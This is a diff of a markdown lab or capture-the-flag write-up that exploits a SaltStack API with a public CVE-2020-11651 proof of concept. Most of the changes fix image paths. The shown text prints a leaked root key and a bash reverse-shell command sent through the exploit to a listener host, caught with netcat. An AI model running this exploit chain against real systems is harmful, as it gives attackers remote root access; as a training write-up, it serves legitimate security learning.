@@ -30,7 +30,7 @@ PORT     STATE SERVICE VERSION
 
 `curl`'ing this service shows an `X-Upstream:` header set to `salt-api/3000-1`
 
-![curl-salt-resp.png](../_resources/curl-salt-resp-2.png)
+![curl-salt-resp.png](../_resources/curl-salt-resp.png)
 
 Checking `searchsploit` we see that there appears to be an exploit for this version.
 
@@ -39,24 +39,26 @@ Checking `searchsploit` we see that there appears to be an exploit for this vers
 I end up Googling around and test driving different exploits on GitHub, eventually settling for this one:
 
 https://github.com/jasperla/CVE-2020-11651-poc
-![373e815aa520362e3a9cfc7031aec68f.png](../_resources/373e815aa520362e3a9cfc7031aec68f-1.png)
+![373e815aa520362e3a9cfc7031aec68f.png](../_resources/373e815aa520362e3a9cfc7031aec68f.png)
 
 `root key obtained: sxZXn5kSJ8GhLjvneaBPMAoMlbqbUNuZ2drFuheYR8r/goL8Iij0bGn7at8vI4Md1I5ESLm3+aw`
 
-![03fdfcb00ca1d33a1fe5deb09d5677c1.png](../_resources/03fdfcb00ca1d33a1fe5deb09d5677c1-1.png)
+![03fdfcb00ca1d33a1fe5deb09d5677c1.png](../_resources/03fdfcb00ca1d33a1fe5deb09d5677c1.png)
 
 `python3 exploit.py --master 192.168.70.62 --exec "ping 192.168.49.70"`
 
-![b04030ace7803b85e7ed4c8282765e7c.png](../_resources/b04030ace7803b85e7ed4c8282765e7c-1.png)
+![b04030ace7803b85e7ed4c8282765e7c.png](../_resources/b04030ace7803b85e7ed4c8282765e7c.png)
 
 `sudo tcpdump -i tun0 icmp`
 
-![ffe57665d08820b789f52ad0d24b2996.png](../_resources/ffe57665d08820b789f52ad0d24b2996-1.png)
+![ffe57665d08820b789f52ad0d24b2996.png](../_resources/ffe57665d08820b789f52ad0d24b2996.png)
 
 `python3 exploit.py --master 192.168.70.62 --exec "bash -i >& /dev/tcp/192.168.49.70/80 0>&1"`
 
-![f59d31cd3ee31ca4dc9a76a562e168e8.png](../_resources/f59d31cd3ee31ca4dc9a76a562e168e8-1.png)
+![f59d31cd3ee31ca4dc9a76a562e168e8.png](../_resources/f59d31cd3ee31ca4dc9a76a562e168e8.png)
 
 `sudo nc -nlvp 80`
 
-![ce6704036c74e5cab812198a9fccf58e.png](../_resources/ce6704036c74e5cab812198a9fccf58e-1.png)
+We are root!
+
+![ce6704036c74e5cab812198a9fccf58e.png](../_resources/ce6704036c74e5cab812198a9fccf58e.png)
